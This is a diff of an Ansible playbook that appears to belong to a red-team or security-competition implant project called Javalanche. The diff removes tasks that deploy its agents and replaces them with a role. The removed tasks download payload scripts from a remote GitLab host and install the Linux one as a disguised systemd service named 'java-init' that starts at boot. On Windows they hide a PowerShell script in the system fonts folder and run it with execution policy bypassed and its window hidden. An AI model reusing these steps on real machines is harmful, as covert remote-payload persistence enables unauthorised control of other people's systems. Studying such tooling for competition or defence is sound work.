@@ -1,31 +1,6 @@
 ---
-- name: Deploy Linux Agents
-  hosts: lin
+- name: Deploy
+  hosts: linux:windows
   become: yes
-  tasks:
-    - name: Download Agent
-      get_url:
-        url: https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.sh?ref_type=heads
-        dest: /etc/javalanche.sh
-        mode: '0755'
-    - name: Downlaod Service file
-      get_url:
-        url: https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/java-init.service?ref_type=heads
-        dest: /lib/systemd/system/java-init.service
-        mode: 644
-    - name: Reload Service Daemons
-      systemd:
-        daemon_reload: yes
-    - name: Start and Enable Service
-      service:
-        name: java-init
-        enabled: yes
-        state: started
-- name: Deploy Windows
-  hosts: win
-  become: yes
-  tasks:
-     - name: Download agent
-       win_shell: wget -o C:\\Windows\\fonts\\javalanche.ps1 https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsPayload.ps1?ref_type=heads
-     - name: Run Agent
-       win_shell: powershell.exe "Start-Process powershell.exe -ExecutionPolicy ByPass -WindowStyle Hidden -File C:\Windows\fonts\javalanche.ps1 -RunAs"
+  roles:
+    - javalanche
